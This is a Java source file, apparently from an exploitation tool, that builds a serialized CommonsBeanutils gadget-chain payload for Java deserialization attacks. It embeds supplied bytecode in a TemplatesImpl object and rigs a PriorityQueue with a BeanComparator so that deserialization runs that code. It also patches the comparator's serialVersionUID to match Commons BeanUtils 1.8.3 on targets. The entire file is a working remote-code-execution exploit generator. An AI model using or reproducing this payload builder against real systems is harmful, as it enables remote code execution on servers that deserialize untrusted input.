package cn.safe6.payload;

import cn.safe6.util.Gadgets;
import cn.safe6.util.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;


import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;


public class CommonsBeanutils183NOCC {


    public static byte[] getPayload(byte[] bytes) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(bytes);



        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
        BeanComparator comparator;
        if (!ctClass.isFrozen()){
            CtField field = CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctClass);
            ctClass.addField(field);
            Class beanCompareClazz= ctClass.toClass();
            comparator = (BeanComparator) beanCompareClazz.newInstance();
        }else {
            comparator = (BeanComparator) Class.forName("org.apache.commons.beanutils.BeanComparator").newInstance();
        }




        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = template;
        queueArray[1] = template;


        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();


        return barr.toByteArray();


    }
}
